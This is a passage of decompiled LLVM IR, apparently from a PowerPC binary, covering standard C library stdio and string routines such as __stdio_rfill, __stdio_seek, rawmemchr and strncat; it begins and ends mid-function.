  %v2_10011e04 = sub nsw i32 %v1_10011dd4, %v5_10011dfc
  %v1_10011e08 = add nsw i32 %v2_10011e04, -1
  store i32 %v1_10011e08, i32* %r10.global-to-local, align 4
  %tmp7 = icmp slt i32 %v4_10011df8, 1
  br i1 %tmp7, label %dec_label_pc_10011e18, label %dec_label_pc_10011e10

dec_label_pc_10011e10:                            ; preds = %dec_label_pc_10011df8
  %v2_10011e10 = add i32 %tmp, 2
  %v3_10011e10 = inttoptr i32 %v2_10011e10 to i8*
  %v4_10011e10 = load i8, i8* %v3_10011e10, align 1
  %v5_10011e10 = zext i8 %v4_10011e10 to i32
  %v2_10011e14 = sub nsw i32 %v1_10011e08, %v5_10011e10
  store i32 %v2_10011e14, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10011e18

dec_label_pc_10011e18:                            ; preds = %dec_label_pc_10011df8, %dec_label_pc_10011ddc, %dec_label_pc_10011dd4, %entry, %dec_label_pc_10011e10
  %v0_10011e3c = phi i32 [ %v1_10011e08, %dec_label_pc_10011df8 ], [ %v1_10011dd4, %dec_label_pc_10011ddc ], [ 0, %dec_label_pc_10011dd4 ], [ 0, %entry ], [ %v2_10011e14, %dec_label_pc_10011e10 ]
  %v1_10011e18 = and i32 %v4_10011dc8, 64
  %v3_10011e18 = icmp eq i32 %v1_10011e18, 0
  %storemerge.in.in.v = select i1 %v3_10011e18, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %tmp
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v2_10011e2c = add i32 %tmp, 16
  %v3_10011e2c = inttoptr i32 %v2_10011e2c to i32*
  %v4_10011e2c = load i32, i32* %v3_10011e2c, align 4
  %v1_10011e30 = inttoptr i32 %arg2 to i32*
  %v2_10011e30 = load i32, i32* %v1_10011e30, align 4
  store i32 %v2_10011e30, i32* %r4.global-to-local, align 4
  %v2_10011e34 = sub i32 %storemerge, %v4_10011e2c
  %v1_10011e38 = add i32 %arg2, 4
  %v2_10011e38 = inttoptr i32 %v1_10011e38 to i32*
  %v3_10011e38 = load i32, i32* %v2_10011e38, align 4
  store i32 %v3_10011e38, i32* %r5.global-to-local, align 4
  %v2_10011e3c = add i32 %v2_10011e34, %v0_10011e3c
  store i32 %v2_10011e3c, i32* %r31.global-to-local, align 4
  %tmp10 = icmp slt i32 %v2_10011e3c, 0
  %v1_10011e44 = zext i1 %tmp10 to i32
  %v2_10011e44 = ashr i32 %v2_10011e3c, 31
  %v3_10011e44 = and i32 %v2_10011e44, -2
  %v4_10011e44 = or i32 %v3_10011e44, %v1_10011e44
  %v2_10011e48 = sub i32 %v3_10011e38, %v2_10011e3c
  %v3_10011e48 = sub i32 -1, %v2_10011e3c
  store i32 %v2_10011e48, i32* %r10.global-to-local, align 4
  %v6_10011e48 = icmp ule i32 %v2_10011e48, %v3_10011e48
  %v2_10011e4c = sub nsw i32 -1, %v4_10011e44
  %v3_10011e4c = add i32 %v2_10011e30, %v2_10011e4c
  %v5_10011e4c = zext i1 %v6_10011e48 to i32
  %v6_10011e4c = add i32 %v3_10011e4c, %v5_10011e4c
  store i32 %v6_10011e4c, i32* %v1_10011e30, align 4
  %v0_10011e54 = load i32, i32* %r10.global-to-local, align 4
  %v1_10011e54 = load i32, i32* @r8, align 4
  %v2_10011e54 = add i32 %v1_10011e54, 4
  %v3_10011e54 = inttoptr i32 %v2_10011e54 to i32*
  store i32 %v0_10011e54, i32* %v3_10011e54, align 4
  %v0_10011e58 = load i32, i32* @r8, align 4
  %v1_10011e58 = inttoptr i32 %v0_10011e58 to i32*
  %v2_10011e58 = load i32, i32* %v1_10011e58, align 4
  %v1_10011e5c = load i32, i32* %r4.global-to-local, align 4
  %v3_10011e5c = icmp sgt i32 %v2_10011e58, %v1_10011e5c
  br i1 %v3_10011e5c, label %dec_label_pc_10011e74, label %dec_label_pc_10011e64

dec_label_pc_10011e64:                            ; preds = %dec_label_pc_10011e18
  %v4_10011e5c = icmp eq i32 %v2_10011e58, %v1_10011e5c
  br i1 %v4_10011e5c, label %dec_label_pc_10011e68, label %dec_label_pc_10011e78thread-pre-split

dec_label_pc_10011e68:                            ; preds = %dec_label_pc_10011e64
  %v1_10011e68 = add i32 %v0_10011e58, 4
  %v2_10011e68 = inttoptr i32 %v1_10011e68 to i32*
  %v3_10011e68 = load i32, i32* %v2_10011e68, align 4
  %v1_10011e6c = load i32, i32* %r5.global-to-local, align 4
  %v3_10011e6c = icmp ugt i32 %v3_10011e68, %v1_10011e6c
  br i1 %v3_10011e6c, label %dec_label_pc_10011e74, label %dec_label_pc_10011e78thread-pre-split

dec_label_pc_10011e74:                            ; preds = %dec_label_pc_10011e68, %dec_label_pc_10011e18
  %v0_10011e74 = load i32, i32* %r31.global-to-local, align 4
  %v1_10011e74 = sub i32 0, %v0_10011e74
  store i32 %v1_10011e74, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10011e78

dec_label_pc_10011e78thread-pre-split:            ; preds = %dec_label_pc_10011e64, %dec_label_pc_10011e68
  %v0_10011e78.pr = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10011e78

dec_label_pc_10011e78:                            ; preds = %dec_label_pc_10011e78thread-pre-split, %dec_label_pc_10011e74
  %v0_10011e78 = phi i32 [ %v0_10011e78.pr, %dec_label_pc_10011e78thread-pre-split ], [ %v1_10011e74, %dec_label_pc_10011e74 ]
  %tmp8 = icmp sgt i32 %v0_10011e78, -1
  br i1 %tmp8, label %dec_label_pc_10011e94, label %dec_label_pc_10011e80

dec_label_pc_10011e80:                            ; preds = %dec_label_pc_10011e78
  %v0_10011e80 = call i32 @__errno_location()
  %v2_10011e88 = inttoptr i32 %v0_10011e80 to i32*
  store i32 75, i32* %v2_10011e88, align 4
  %v0_10011e98.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10011e94

dec_label_pc_10011e90:                            ; preds = %dec_label_pc_10011dec, %dec_label_pc_10011de4
  store i32 -1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10011e94

dec_label_pc_10011e94:                            ; preds = %dec_label_pc_10011e78, %dec_label_pc_10011e80, %dec_label_pc_10011e90
  %v0_10011e98 = phi i32 [ %v0_10011e78, %dec_label_pc_10011e78 ], [ %v0_10011e98.pre, %dec_label_pc_10011e80 ], [ -1, %dec_label_pc_10011e90 ]
  ret i32 %v0_10011e98

; uselistorder directives
  uselistorder i32 %v2_10011e58, { 1, 0 }
  uselistorder i32 %v2_10011e3c, { 0, 2, 3, 1, 4 }
  uselistorder i16 %tmp9, { 1, 0 }
  uselistorder i32 %tmp, { 5, 0, 1, 3, 2, 4 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r31.global-to-local, { 0, 2, 4, 1, 3, 5 }
  uselistorder i32 2048, { 1, 2, 3, 4, 0, 5 }
  uselistorder i16 4, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_10011e94, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10011e78thread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_10011e18, { 4, 0, 1, 2, 3 }
}

define i32 @__stdio_rfill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %v0_10011eac = load i32, i32* @lr, align 4
  store i32 %v0_10011eac, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r29, align 4
  %v1_10011ec0 = add i32 %arg1, 8
  %v2_10011ec0 = inttoptr i32 %v1_10011ec0 to i32*
  %v3_10011ec0 = load i32, i32* %v2_10011ec0, align 4
  %v1_10011ec4 = add i32 %arg1, 12
  %v2_10011ec4 = inttoptr i32 %v1_10011ec4 to i32*
  %v3_10011ec4 = load i32, i32* %v2_10011ec4, align 4
  %v2_10011ec8 = sub i32 %v3_10011ec4, %v3_10011ec0
  store i32 268508880, i32* @lr, align 4
  %v3_10011ecc = inttoptr i32 %v3_10011ec0 to i16*
  %v4_10011ecc = call i32 @__stdio_READ(i16* %v3_10011ecc, i32 %v2_10011ec8, i32 %v2_10011ec8)
  %v0_10011ed0 = load i32, i32* @r29, align 4
  %v1_10011ed0 = add i32 %v0_10011ed0, 8
  %v2_10011ed0 = inttoptr i32 %v1_10011ed0 to i32*
  %v3_10011ed0 = load i32, i32* %v2_10011ed0, align 4
  %v2_10011ed4 = add i32 %v3_10011ed0, %v4_10011ecc
  store i32 %v2_10011ed4, i32* %r0.global-to-local, align 4
  %v2_10011ed8 = add i32 %v0_10011ed0, 16
  %v3_10011ed8 = inttoptr i32 %v2_10011ed8 to i32*
  store i32 %v3_10011ed0, i32* %v3_10011ed8, align 4
  %v0_10011edc = load i32, i32* %r0.global-to-local, align 4
  %v1_10011edc = load i32, i32* @r29, align 4
  %v2_10011edc = add i32 %v1_10011edc, 20
  %v3_10011edc = inttoptr i32 %v2_10011edc to i32*
  store i32 %v0_10011edc, i32* %v3_10011edc, align 4
  store i32 %v0_10011eac, i32* %r0.global-to-local, align 4
  ret i32 %v4_10011ecc

; uselistorder directives
  uselistorder i32 %v3_10011ed0, { 1, 0 }
  uselistorder i32 %v4_10011ecc, { 1, 0 }
  uselistorder i32 %v3_10011ec0, { 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
}

define i32 @__stdio_trans2r_o(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %v0_10011efc = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  %v3_10011f08 = load i16, i16* %arg1, align 2
  %v4_10011f08 = zext i16 %v3_10011f08 to i32
  %v2_10011f0c = and i32 %v4_10011f08, %arg2
  %v5_10011f0c = icmp eq i32 %v2_10011f0c, 0
  br i1 %v5_10011f0c, label %dec_label_pc_10011f14, label %dec_label_pc_10011f24

dec_label_pc_10011f14:                            ; preds = %entry
  %v1_10011f14 = and i32 %v4_10011f08, 2176
  %v3_10011f14 = icmp eq i32 %v1_10011f14, 0
  br i1 %v3_10011f14, label %dec_label_pc_10011f1c, label %dec_label_pc_10011f30

dec_label_pc_10011f1c:                            ; preds = %dec_label_pc_10011f14
  %v2_10011f1c = or i32 %v4_10011f08, %arg2
  %v1_10011f20 = trunc i32 %v2_10011f1c to i16
  store i16 %v1_10011f20, i16* %arg1, align 2
  %v0_10011f24.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10011f24

dec_label_pc_10011f24:                            ; preds = %entry, %dec_label_pc_10011f1c
  %v0_10011f24 = phi i32 [ %tmp, %entry ], [ %v0_10011f24.pre, %dec_label_pc_10011f1c ]
  %v1_10011f24 = inttoptr i32 %v0_10011f24 to i16*
  %v2_10011f24 = load i16, i16* %v1_10011f24, align 2
  %v3_10011f24 = zext i16 %v2_10011f24 to i32
  %v1_10011f28 = and i32 %v3_10011f24, 16
  %v3_10011f28 = icmp eq i32 %v1_10011f28, 0
  br i1 %v3_10011f28, label %dec_label_pc_10011f4c, label %dec_label_pc_10011f30

dec_label_pc_10011f30:                            ; preds = %dec_label_pc_10011f14, %dec_label_pc_10011f24
  %v0_10011f30 = call i32 @__errno_location()
  store i32 %v0_10011f30, i32* %r3.global-to-local, align 4
  %v2_10011f38 = inttoptr i32 %v0_10011f30 to i32*
  store i32 9, i32* %v2_10011f38, align 4
  br label %dec_label_pc_10011f3c

dec_label_pc_10011f3c:                            ; preds = %dec_label_pc_10011f54, %dec_label_pc_10011f30
  %v0_10011f3c = load i32, i32* @r31, align 4
  %v1_10011f3c = inttoptr i32 %v0_10011f3c to i16*
  %v2_10011f3c = load i16, i16* %v1_10011f3c, align 2
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_10011f44 = or i16 %v2_10011f3c, 8
  br label %dec_label_pc_10011f80

dec_label_pc_10011f4c:                            ; preds = %dec_label_pc_10011f24
  %v1_10011f4c = and i32 %v3_10011f24, 64
  %v3_10011f4c = icmp eq i32 %v1_10011f4c, 0
  br i1 %v3_10011f4c, label %dec_label_pc_10011f74, label %dec_label_pc_10011f54

dec_label_pc_10011f54:                            ; preds = %dec_label_pc_10011f4c
  store i32 268509016, i32* @lr, align 4
  %v0_10011f54 = call i32 @__stdio_wcommit()
  store i32 %v0_10011f54, i32* %r3.global-to-local, align 4
  %v3_10011f58 = icmp eq i32 %v0_10011f54, 0
  br i1 %v3_10011f58, label %dec_label_pc_10011f60, label %dec_label_pc_10011f3c

dec_label_pc_10011f60:                            ; preds = %dec_label_pc_10011f54
  %v0_10011f60 = load i32, i32* @r31, align 4
  %v1_10011f60 = inttoptr i32 %v0_10011f60 to i16*
  %v2_10011f60 = load i16, i16* %v1_10011f60, align 2
  %v3_10011f60 = zext i16 %v2_10011f60 to i32
  %v1_10011f64 = add i32 %v0_10011f60, 8
  %v2_10011f64 = inttoptr i32 %v1_10011f64 to i32*
  %v3_10011f64 = load i32, i32* %v2_10011f64, align 4
  %v1_10011f68 = call i32 @__asm_rlwinm(i32 %v3_10011f60, i32 0, i32 26, i32 24)
  %v2_10011f68 = trunc i32 %v1_10011f68 to i16
  %v1_10011f6c = load i32, i32* @r31, align 4
  %v2_10011f6c = add i32 %v1_10011f6c, 28
  %v3_10011f6c = inttoptr i32 %v2_10011f6c to i32*
  store i32 %v3_10011f64, i32* %v3_10011f6c, align 4
  %v3_10011f70 = load i32, i32* @r31, align 4
  %v4_10011f70 = inttoptr i32 %v3_10011f70 to i16*
  store i16 %v2_10011f68, i16* %v4_10011f70, align 2
  %v0_10011f74.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10011f74

dec_label_pc_10011f74:                            ; preds = %dec_label_pc_10011f4c, %dec_label_pc_10011f60
  %v0_10011f74 = phi i32 [ %v0_10011f24, %dec_label_pc_10011f4c ], [ %v0_10011f74.pre, %dec_label_pc_10011f60 ]
  %v1_10011f74 = inttoptr i32 %v0_10011f74 to i16*
  %v2_10011f74 = load i16, i16* %v1_10011f74, align 2
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_10011f7c = or i16 %v2_10011f74, 1
  br label %dec_label_pc_10011f80

dec_label_pc_10011f80:                            ; preds = %dec_label_pc_10011f3c, %dec_label_pc_10011f74
  %v2_10011f80 = phi i32 [ %v0_10011f3c, %dec_label_pc_10011f3c ], [ %v0_10011f74, %dec_label_pc_10011f74 ]
  %storemerge.off0 = phi i16 [ %v1_10011f44, %dec_label_pc_10011f3c ], [ %v1_10011f7c, %dec_label_pc_10011f74 ]
  %v3_10011f80 = inttoptr i32 %v2_10011f80 to i16*
  store i16 %storemerge.off0, i16* %v3_10011f80, align 2
  store i32 %v0_10011efc, i32* @r31, align 4
  %v0_10011f94 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10011f94

; uselistorder directives
  uselistorder i32 %v4_10011f08, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1, 3, 4 }
  uselistorder i32 26, { 4, 2, 5, 6, 3, 8, 9, 1, 7, 0 }
  uselistorder i32 ()* @__stdio_wcommit, { 3, 6, 5, 4, 2, 1, 0 }
  uselistorder i32 64, { 6, 3, 4, 5, 2, 8, 9, 11, 7, 12, 0, 1, 10 }
  uselistorder i16 8, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 2176, { 1, 0 }
  uselistorder i16* %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10011f80, { 1, 0 }
  uselistorder label %dec_label_pc_10011f74, { 1, 0 }
  uselistorder label %dec_label_pc_10011f30, { 1, 0 }
  uselistorder label %dec_label_pc_10011f24, { 1, 0 }
}

define i32 @__stdio_seek(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %v0_10011f98 = load i32, i32* @lr, align 4
  store i32 %v0_10011f98, i32* %r0.global-to-local, align 4
  store i32 %arg3, i32* @r7, align 4
  %v0_10011fa4 = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  %v1_10011fb0 = add i32 %arg1, 4
  %v2_10011fb0 = inttoptr i32 %v1_10011fb0 to i32*
  %v3_10011fb0 = load i32, i32* %v2_10011fb0, align 4
  %v2_10011fb4 = load i32, i32* %arg2, align 4
  %v1_10011fb8 = add i32 %tmp, 4
  %v2_10011fb8 = inttoptr i32 %v1_10011fb8 to i32*
  %v3_10011fb8 = load i32, i32* %v2_10011fb8, align 4
  store i32 268509120, i32* @lr, align 4
  %v4_10011fbc = call i32 @__libc_lseek64(i32 %v3_10011fb0, i32 %v2_10011fb4, i32 %v3_10011fb8, i32 %arg3)
  %v1_10011fc0 = icmp slt i32 %v4_10011fbc, 0
  store i32 %tmp, i32* %r0.global-to-local, align 4
  br i1 %v1_10011fc0, label %dec_label_pc_10011fd8, label %dec_label_pc_10011fcc

dec_label_pc_10011fcc:                            ; preds = %entry
  %v1_10011fcc = load i32, i32* @r31, align 4
  %v2_10011fcc = inttoptr i32 %v1_10011fcc to i32*
  store i32 %v4_10011fbc, i32* %v2_10011fcc, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_10011fd4 = load i32, i32* @r31, align 4
  %v2_10011fd4 = add i32 %v1_10011fd4, 4
  %v3_10011fd4 = inttoptr i32 %v2_10011fd4 to i32*
  store i32 %tmp, i32* %v3_10011fd4, align 4
  %v0_10011fd8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10011fd8

dec_label_pc_10011fd8:                            ; preds = %entry, %dec_label_pc_10011fcc
  %v0_10011fd8 = phi i32 [ %tmp, %entry ], [ %v0_10011fd8.pre, %dec_label_pc_10011fcc ]
  store i32 %v0_10011f98, i32* %r0.global-to-local, align 4
  store i32 %v0_10011fa4, i32* @r31, align 4
  ret i32 %v0_10011fd8

; uselistorder directives
  uselistorder i32 %tmp, { 0, 1, 3, 4, 2 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_10011fd8, { 1, 0 }
}

define i32 @rawmemchr(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %v1_10011ff0 = urem i32 %arg1, 256
  store i32 %v1_10011ff0, i32* %r4.global-to-local, align 4
  %v0_100120081 = load i32, i32* @r3, align 4
  %v1_100120082 = urem i32 %v0_100120081, 4
  %v3_100120084 = icmp eq i32 %v1_100120082, 0
  br i1 %v3_100120084, label %dec_label_pc_10012010, label %dec_label_pc_10011ff8

dec_label_pc_10011ff8:                            ; preds = %entry, %dec_label_pc_10011ff8
  %v1_10011ffc = phi i32 [ %v0_10012010.pre, %dec_label_pc_10011ff8 ], [ %v1_10011ff0, %entry ]
  %v0_10011ff8 = phi i32 [ %v1_10012004, %dec_label_pc_10011ff8 ], [ %v0_100120081, %entry ]
  %v1_10011ff8 = inttoptr i32 %v0_10011ff8 to i8*
  %v2_10011ff8 = load i8, i8* %v1_10011ff8, align 1
  %v3_10011ff8 = zext i8 %v2_10011ff8 to i32
  %v4_10011ffc = icmp eq i32 %v3_10011ff8, %v1_10011ffc
  %v0_10012000 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_10011ffc, i32 %v0_10012000)
  %v0_10012004 = load i32, i32* @r3, align 4
  %v1_10012004 = add i32 %v0_10012004, 1
  store i32 %v1_10012004, i32* @r3, align 4
  %v1_10012008 = urem i32 %v1_10012004, 4
  %v3_10012008 = icmp eq i32 %v1_10012008, 0
  %v0_10012010.pre = load i32, i32* %r4.global-to-local, align 4
  br i1 %v3_10012008, label %dec_label_pc_10012010, label %dec_label_pc_10011ff8

dec_label_pc_10012010:                            ; preds = %dec_label_pc_10011ff8, %entry
  %v0_100120289 = phi i32 [ %v0_100120081, %entry ], [ %v1_10012004, %dec_label_pc_10011ff8 ]
  %v0_10012010 = phi i32 [ %v1_10011ff0, %entry ], [ %v0_10012010.pre, %dec_label_pc_10011ff8 ]
  %v1_10012010 = mul i32 %v0_10012010, 256
  %v2_10012018 = or i32 %v1_10012010, %v0_10012010
  %v1_10012020 = mul i32 %v2_10012018, 65536
  %v2_10012024 = or i32 %v1_10012020, %v2_10012018
  br label %dec_label_pc_10012028

dec_label_pc_10012028:                            ; preds = %dec_label_pc_10012094, %dec_label_pc_10012028, %dec_label_pc_10012010
  %v0_10012064 = phi i32 [ %v0_100120289, %dec_label_pc_10012010 ], [ %v1_1001202c, %dec_label_pc_10012028 ], [ %v1_1001202c, %dec_label_pc_10012094 ]
  %v1_10012028 = inttoptr i32 %v0_10012064 to i32*
  %v2_10012028 = load i32, i32* %v1_10012028, align 4
  %v1_1001202c = add i32 %v0_10012064, 4
  %v1_10012030 = add i32 %v0_10012064, 2
  %v2_10012034 = xor i32 %v2_10012028, %v2_10012024
  %v1_1001203c = add i32 %v2_10012034, 2130640639
  %v2_10012040 = xor i32 %v1_1001203c, %v2_10012034
  %v1_10012044 = add i32 %v0_10012064, 1
  %v2_10012048 = and i32 %v2_10012040, -2130640640
  %v6_10012048 = icmp eq i32 %v2_10012048, -2130640640
  br i1 %v6_10012048, label %dec_label_pc_10012028, label %dec_label_pc_10012054

dec_label_pc_10012054:                            ; preds = %dec_label_pc_10012028
  %v2_10012054 = inttoptr i32 %v0_10012064 to i8*
  %v3_10012054 = load i8, i8* %v2_10012054, align 1
  %v4_10012054 = zext i8 %v3_10012054 to i32
  %v1_10012058 = add i32 %v0_10012064, 3
  %v4_1001205c = icmp eq i32 %v4_10012054, %v0_10012010
  br i1 %v4_1001205c, label %dec_label_pc_10012064, label %dec_label_pc_1001206c

dec_label_pc_10012064:                            ; preds = %dec_label_pc_10012054
  ret i32 %v0_10012064

dec_label_pc_1001206c:                            ; preds = %dec_label_pc_10012054
  %v2_1001206c = inttoptr i32 %v1_10012044 to i8*
  %v3_1001206c = load i8, i8* %v2_1001206c, align 1
  %v4_1001206c = zext i8 %v3_1001206c to i32
  %v4_10012070 = icmp eq i32 %v4_1001206c, %v0_10012010
  br i1 %v4_10012070, label %dec_label_pc_10012078, label %dec_label_pc_10012080

dec_label_pc_10012078:                            ; preds = %dec_label_pc_1001206c
  ret i32 %v1_10012044

dec_label_pc_10012080:                            ; preds = %dec_label_pc_1001206c
  %v2_10012080 = inttoptr i32 %v1_10012030 to i8*
  %v3_10012080 = load i8, i8* %v2_10012080, align 1
  %v4_10012080 = zext i8 %v3_10012080 to i32
  %v4_10012084 = icmp eq i32 %v4_10012080, %v0_10012010
  br i1 %v4_10012084, label %dec_label_pc_1001208c, label %dec_label_pc_10012094

dec_label_pc_1001208c:                            ; preds = %dec_label_pc_10012080
  ret i32 %v1_10012030

dec_label_pc_10012094:                            ; preds = %dec_label_pc_10012080
  %v2_10012094 = inttoptr i32 %v1_10012058 to i8*
  %v3_10012094 = load i8, i8* %v2_10012094, align 1
  %v4_10012094 = zext i8 %v3_10012094 to i32
  %v4_10012098 = icmp eq i32 %v4_10012094, %v0_10012010
  br i1 %v4_10012098, label %dec_label_pc_100120a0, label %dec_label_pc_10012028

dec_label_pc_100120a0:                            ; preds = %dec_label_pc_10012094
  ret i32 %v1_10012058

; uselistorder directives
  uselistorder i32 %v1_1001202c, { 1, 0 }
  uselistorder i32 %v0_10012064, { 0, 1, 3, 2, 6, 5, 4 }
  uselistorder i32 %v2_10012018, { 1, 0 }
  uselistorder i32 %v0_10012010, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_10012004, { 1, 0, 3, 2 }
  uselistorder i32 %v0_100120081, { 2, 1, 0 }
  uselistorder i32 %v1_10011ff0, { 1, 2, 0 }
  uselistorder i32 -2130640640, { 0, 3, 2, 9, 1, 4, 10, 5, 6, 7, 8 }
  uselistorder label %dec_label_pc_10011ff8, { 1, 0 }
}

define i32 @__GI_strncat(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_100120ac

dec_label_pc_100120ac:                            ; preds = %dec_label_pc_100120ac, %entry
  %v0_100120ac = phi i32 [ %v1_100120b0, %dec_label_pc_100120ac ], [ %tmp, %entry ]
  %v1_100120ac = inttoptr i32 %v0_100120ac to i8*
  %v2_100120ac = load i8, i8* %v1_100120ac, align 1
  %v1_100120b0 = add i32 %v0_100120ac, 1
  store i32 %v1_100120b0, i32* %r11.global-to-local, align 4
  %v3_100120b4 = icmp eq i8 %v2_100120ac, 0
  store i1 %v3_100120b4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100120b4, label %dec_label_pc_100120bc, label %dec_label_pc_100120ac

dec_label_pc_100120bc:                            ; preds = %dec_label_pc_100120ac
  %v3_100120bc = icmp eq i32 %arg2, 3
  store i1 %v3_100120bc, i1* %cr7_eq.global-to-local, align 1
  %v1_100120c0 = add i32 %v0_100120ac, -1
  store i32 %v1_100120c0, i32* %r11.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  %tmp8 = icmp ult i32 %arg2, 4
  br i1 %tmp8, label %dec_label_pc_1001215c, label %dec_label_pc_100120cc

dec_label_pc_100120cc:                            ; preds = %dec_label_pc_100120bc
  %v1_100120cc = udiv i32 %arg2, 4
  store i32 %v1_100120cc, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_100120d4

dec_label_pc_100120d4:                            ; preds = %dec_label_pc_100120d4.dec_label_pc_100120d4_crit_edge, %dec_label_pc_100120cc
  %v2_100120e4 = phi i32 [ %v0_100120d8.pre, %dec_label_pc_100120d4.dec_label_pc_100120d4_crit_edge ], [ %v1_100120c0, %dec_label_pc_100120cc ]
  %v0_100120d4 = load i32, i32* @r4, align 4
  %v1_100120d4 = inttoptr i32 %v0_100120d4 to i8*
  %v2_100120d4 = load i8, i8* %v1_100120d4, align 1
  %v1_100120d8 = add i32 %v2_100120e4, 1
  store i32 %v1_100120d8, i32* %r9.global-to-local, align 4
  %v1_100120dc = add i32 %v2_100120e4, 2
  store i32 %v1_100120dc, i32* %r7.global-to-local, align 4
  %v3_100120e0 = icmp eq i8 %v2_100120d4, 0
  store i1 %v3_100120e0, i1* %cr7_eq.global-to-local, align 1
  %v4_100120e4 = inttoptr i32 %v1_100120d8 to i8*
  store i8 %v2_100120d4, i8* %v4_100120e4, align 1
  %v0_100120e8 = load i32, i32* @r4, align 4
  %v1_100120e8 = add i32 %v0_100120e8, 1
  store i32 %v1_100120e8, i32* %r11.global-to-local, align 4
  %v0_100120ec = load i32, i32* @lr, align 4
  %v1_100120ec = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_100120ec, i32 %v0_100120ec)
  %v0_100120f0 = load i32, i32* @r4, align 4
  %v1_100120f0 = add i32 %v0_100120f0, 1
  %v2_100120f0 = inttoptr i32 %v1_100120f0 to i8*
  %v3_100120f0 = load i8, i8* %v2_100120f0, align 1
  %v0_100120f4 = load i32, i32* %r11.global-to-local, align 4
  %v1_100120f4 = add i32 %v0_100120f4, 1
  store i32 %v1_100120f4, i32* %r8.global-to-local, align 4
  %v0_100120f8 = load i32, i32* %r7.global-to-local, align 4
  %v1_100120f8 = add i32 %v0_100120f8, 1
  store i32 %v1_100120f8, i32* %r10.global-to-local, align 4
  %v3_100120fc = icmp eq i8 %v3_100120f0, 0
  store i1 %v3_100120fc, i1* %cr7_eq.global-to-local, align 1
  %v2_10012100 = load i32, i32* %r9.global-to-local, align 4
  %v3_10012100 = add i32 %v2_10012100, 1
  %v4_10012100 = inttoptr i32 %v3_10012100 to i8*
  store i8 %v3_100120f0, i8* %v4_10012100, align 1
  %v0_10012104 = load i32, i32* %r8.global-to-local, align 4
  %v1_10012104 = add i32 %v0_10012104, 1
  store i32 %v1_10012104, i32* %r9.global-to-local, align 4
  %v1_10012108 = add i32 %v0_10012104, 2
  store i32 %v1_10012108, i32* @r4, align 4
  %v0_1001210c = load i32, i32* @lr, align 4
  %v1_1001210c = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_1001210c, i32 %v0_1001210c)
  %v0_10012110 = load i32, i32* %r11.global-to-local, align 4
  %v1_10012110 = add i32 %v0_10012110, 1
  %v2_10012110 = inttoptr i32 %v1_10012110 to i8*
  %v3_10012110 = load i8, i8* %v2_10012110, align 1
  %v0_10012114 = load i32, i32* %r10.global-to-local, align 4
  %v1_10012114 = add i32 %v0_10012114, 1
  store i32 %v1_10012114, i32* %r11.global-to-local, align 4
  %v3_10012118 = icmp eq i8 %v3_10012110, 0
  store i1 %v3_10012118, i1* %cr7_eq.global-to-local, align 1
  %v2_1001211c = load i32, i32* %r7.global-to-local, align 4
  %v3_1001211c = add i32 %v2_1001211c, 1
  %v4_1001211c = inttoptr i32 %v3_1001211c to i8*
  store i8 %v3_10012110, i8* %v4_1001211c, align 1
  %v0_10012120 = load i32, i32* @lr, align 4
  %v1_10012120 = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_10012120, i32 %v0_10012120)
  %v0_10012124 = load i32, i32* %r8.global-to-local, align 4
  %v1_10012124 = add i32 %v0_10012124, 1
  %v2_10012124 = inttoptr i32 %v1_10012124 to i8*
